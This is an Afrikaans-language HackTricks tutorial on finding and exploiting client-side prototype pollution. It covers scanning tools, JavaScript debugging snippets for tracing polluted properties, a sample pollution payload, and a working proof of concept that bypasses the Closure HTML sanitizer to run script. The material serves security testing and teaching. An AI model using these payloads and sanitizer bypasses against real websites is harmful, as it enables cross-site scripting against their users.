# Kli√´ntkant Prototipe Besoedeling

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Ontdek deur gebruik te maak van Outomatiese gereedskap

Die gereedskap [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **en** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) kan gebruik word om **prototipe besoedelingskwetsbaarhede** te **vind**.

Daarbenewens kan jy ook die **blaaieruitbreiding** [**PPScan**](https://github.com/msrkp/PPScan) gebruik om outomaties die **bladsye** wat jy **besoek** vir prototipe besoedelingskwetsbaarhede te **skandeer**.

### Foutopsporing waar 'n eienskap gebruik word <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Vind die wortel oorsaak van Prototipe Besoedeling <a href="#id-5530" id="id-5530"></a>

Sodra 'n prototipe besoedelbaarheid deur enige van die gereedskap ge√Ødentifiseer is, en as die kode nie buitensporig kompleks is nie, kan jy die kwesbaarheid vind deur te soek na sleutelwoorde soos `location.hash`, `decodeURIComponent`, of `location.search` in die Chrome Ontwikkelaarshulpmiddels. Hierdie benadering stel jou in staat om die kwesbare gedeelte van die JavaScript-kode te identifiseer.

Vir groter en meer komplekse kodebasisse, 'n maklike metode om die kwesbare kode te ontdek behels die volgende stappe:

1. Gebruik 'n gereedskap om 'n kwesbaarheid te identifiseer en 'n lading te verkry wat ontwerp is om 'n eienskap in die konstrukteur in te stel. 'n Voorbeeld wat deur ppmap voorsien word, kan lyk soos: `constructor[prototype][ppmap]=reserved`.
2. Stel 'n breekpunt in by die eerste lyn van JavaScript-kode wat op die bladsy uitgevoer sal word. Verfris die bladsy met die lading, en stel die uitvoering op hierdie breekpunt stil.
3. Terwyl die JavaScript-uitvoering gestop is, voer die volgende skripsie in die JS-konsole uit. Hierdie skripsie sal aandui wanneer die 'ppmap' eienskap geskep word, wat help om sy oorsprong te vind:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Navigasie terug na die **Bronne**-tabblad en kies "Hervat skripsie-uitvoering". Die JavaScript sal voortgaan met uitvoer, en die 'ppmap' eienskap sal soos verwag besoedel word. Die gebruik van die voorsiene fragment fasiliteer die identifisering van die presiese plek waar die 'ppmap' eienskap besoedel word. Deur die **Oproepstapel** te ondersoek, kan verskillende stakings waar die besoedeling plaasgevind het, waargeneem word.

Wanneer besluit word watter staking ondersoek moet word, is dit dikwels nuttig om stakings te teiken wat verband hou met JavaScript-biblioteek l√™ers, aangesien prototipe besoedeling gereeld binne hierdie biblioteke plaasvind. Identifiseer die relevante staking deur sy aanhegting aan biblioteek l√™ers te ondersoek (sigbaar aan die regterkant, soortgelyk aan 'n beeld wat vir leiding voorsien word). In scenario's met meervoudige stakings, soos di√© op lyne 4 en 6, is die logiese keuse die staking op lyn 4, aangesien dit die aanvanklike voorkoms van besoedeling verteenwoordig en dus die wortel oorsaak van die kwesbaarheid. Deur op die staking te klik, sal dit jou na die kwesbare kode lei.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Vind Skripsie-Gadgets

Die gadget is die **kode wat misbruik sal word sodra 'n PP-kwesbaarheid ontdek word**.

As die aansoek eenvoudig is, kan ons **soek** vir **sleutelwoorde** soos **`srcdoc/innerHTML/iframe/createElement`** en die bronkode deursoek en nagaan of dit tot javascript-uitvoering **lei**. Soms mag genoemde tegnieke glad nie gadgets vind nie. In daardie geval openbaar 'n suiwer bronkode-oorsig sommige aangename gadgets soos die onderstaande voorbeeld.

### Voorbeeld van die vind van PP-gadget in Mithil biblioteekkode

Kyk na hierdie skrywe: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Herkompilasie van vragte vir kwesbare biblioteke

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## HTML Sanitizers omseil via PP

**Hierdie navorsing** wys PP-gadgets wat gebruik kan word om die **saneerders** wat deur sommige HTML-saneerders biblioteke voorsien word, te **omseil**:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Verwysings

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
